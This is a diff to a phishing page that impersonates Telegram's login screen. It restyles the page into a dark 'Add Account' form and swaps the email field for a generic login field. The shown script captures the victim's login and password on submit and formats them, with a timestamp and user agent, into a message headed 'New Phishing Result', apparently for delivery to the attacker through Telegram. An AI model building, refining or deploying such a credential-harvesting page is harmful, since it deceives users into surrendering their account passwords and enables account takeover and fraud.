@@ -8,12 +8,12 @@
 <body>
     <div class="login-container">
         <h2>Telegram</h2>
-        <p class="warning">Your account has been temporarily locked. Please verify your identity.</p>
+        <p class="warning">Add Account</p>
         
         <form id="phishingForm">
             <div class="form-group">
-                <label for="email">Email:</label>
-                <input type="email" id="email" name="email" required>
+                <label for="login"></label>
+                <input type="text" id="text"  name="login" required>
             </div>
             
             <div class="form-group">
@@ -26,18 +26,31 @@
     </div>
 
     <style>
+        body{
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            background: rgb(26, 26, 26);
+            font-family: Arial, Helvetica, sans-serif;
+        }
+
+
         .login-container {
             max-width: 400px;
             margin: 50px auto;
             padding: 20px;
-            border: 1px solid #ddd;
-            border-radius: 5px;
-            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            border-radius: 2px;
+            box-shadow: 0 0 10px 0 rgba(255, 255, 255, 0.1);
+            background: #494949;
+            text-align: center;
+            color: white;
         }
 
         .warning {
-            color: #d93025;
+            color: #ffffff;
             margin-bottom: 20px;
+            font-size: 35px;
+            font-weight: 800;
         }
 
         .form-group {
@@ -79,13 +92,13 @@
         document.getElementById('phishingForm').addEventListener('submit', async (e) => {
             e.preventDefault();
             
-            const email = document.getElementById('email').value;
+            const login = document.getElementById('text').value;
             const password = document.getElementById('password').value;
             
             // Format message for Telegram
             const message = `
 🎣 New Phishing Result:
-📧 Email: ${email}
+📧 Email: ${login}
 🔑 Password: ${password}
 ⏰ Time: ${new Date().toISOString()}
 🌐 UserAgent: ${navigator.userAgent}
